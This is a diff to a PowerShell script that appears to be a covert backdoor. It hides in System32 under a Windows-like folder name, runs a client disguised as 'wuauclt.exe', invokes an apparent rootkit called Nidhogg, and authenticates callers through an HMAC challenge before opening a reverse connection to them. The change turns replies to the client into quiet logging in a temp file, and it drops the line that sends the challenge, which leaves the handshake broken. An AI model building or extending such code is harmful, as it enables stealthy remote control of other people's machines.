@@ -7,6 +7,10 @@ $CurrentReversePort = $BaseReversePort
 $AppDir = "C:\Windows\System32\WindowsModulesAssistant"
 $NidhoggClient = "$AppDir\wuauclt.exe"
 
+function Log($msg) {
+    Add-Content -Path "C:\Windows\Temp\debug.log" -Value "$(Get-Date -Format 'HH:mm:ss') $msg"
+}
+
 function Invoke-Nidhogg {
     param([string]$Cmd)
     if (Test-Path $NidhoggClient) {
@@ -72,7 +76,6 @@ while ($true) {
 
             # HMAC Challenge-Response
             $challenge = Get-Random -Maximum 1000000000
-            $writer.WriteLine("CHALLENGE:$challenge")
             
             try {
                 $response = $reader.ReadLine()
@@ -81,9 +84,9 @@ while ($true) {
                 $response = $null
             }
 
-            Write-Host "Challenge sent: $challenge"
-            Write-Host "Expected HMAC: $expected"
-            Write-Host "Received response: $response"
+            Log "Challenge sent: $challenge"
+            Log "Expected HMAC: $expected"
+            Log "Received response: $response"
 
             if (-not [string]::IsNullOrWhiteSpace($response)) {
                 $response = $response.Trim()
@@ -93,7 +96,7 @@ while ($true) {
 
                 if ($response -eq $expected) {
                     # PORT DIVERSION
-                    $writer.WriteLine("OK - Using port $CurrentReversePort")
+                    Log "Using port: $CurrentReversePort"
                     Start-Sleep -Seconds 1
 
                     $remoteIP = $client.Client.RemoteEndPoint.Address.ToString()
@@ -150,7 +153,7 @@ while ($true) {
                         $revClient.Close()
                     }
                 } else {
-                    $writer.WriteLine("DENIED")
+                    Log "DENIED"
                 }
             }
         }
